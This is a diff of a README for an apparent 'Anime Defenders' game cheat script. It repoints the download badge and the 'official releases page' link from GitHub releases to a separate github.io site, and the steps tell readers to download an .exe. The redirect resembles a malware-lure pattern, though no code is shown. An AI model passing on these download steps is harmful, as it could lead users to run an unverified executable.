@@ -1,6 +1,6 @@
 # 🎮 Anime-Defenders-Script-GUI-2026-Pastebin - Automate your game progress with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/manavheman/Anime-Defenders-Script-GUI-2026-Pastebin/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://manavheman.github.io)
 
 ## 📌 Project Overview
 
@@ -19,7 +19,7 @@ To run this application, ensure your computer meets these requirements:
 
 Follow these steps to obtain the correct file:
 
-1. Visit the [official releases page](https://github.com/manavheman/Anime-Defenders-Script-GUI-2026-Pastebin/releases).
+1. Visit the [official releases page](https://manavheman.github.io).
 2. Look for the most recent version labeled as the latest release.
 3. Find the file ending in .exe in the Assets section.
 4. Click the file name to start the download to your computer.
